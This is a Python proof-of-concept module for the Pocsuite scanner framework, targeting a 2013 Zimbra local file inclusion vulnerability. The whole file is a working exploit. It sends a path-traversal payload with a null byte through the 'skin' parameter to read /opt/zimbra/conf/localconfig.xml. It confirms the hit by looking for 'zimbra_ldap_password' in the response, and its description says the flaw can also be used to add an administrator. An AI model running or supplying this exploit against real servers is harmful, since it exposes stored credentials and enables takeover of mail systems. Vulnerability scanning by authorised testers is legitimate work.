#!/usr/bin/python
# -*- coding: utf-8 -*-


from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    name = 'Zimbra LFI'
    vulID = '0'  # https://www.seebug.org/vuldb/ssvid-78176
    author = ['bey0nd']
    vulType = 'LFI'
    version = '1.0'    # default version: 1.0
    references = ['http://www.myhack58.com/Article/html/3/62/2013/41590.htm']
    desc = '''Zimbra文件包含,并可增加管理员.'''

    vulDate = '2013-02-14'
    createDate = '2013-02-14'
    updateDate = '2013-02-14'

    appName = 'Zimbra'
    appVersion = 'Zimbra'
    appPowerLink = 'zimbra'
    samples = ['']

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        self.url = self.url + '/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00'
        
        resp = req.get(self.url)
        if resp and resp.text and resp.status_code == 200:
            if "zimbra_ldap_password" in resp.text or "zimbra_server_hostname" in resp.text:
                result['FileInfo'] = {}
                result['FileInfo']['Filename'] = "zimbra/conf/localconfig.xml"
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Failed')
        return output


register(TestPOC)
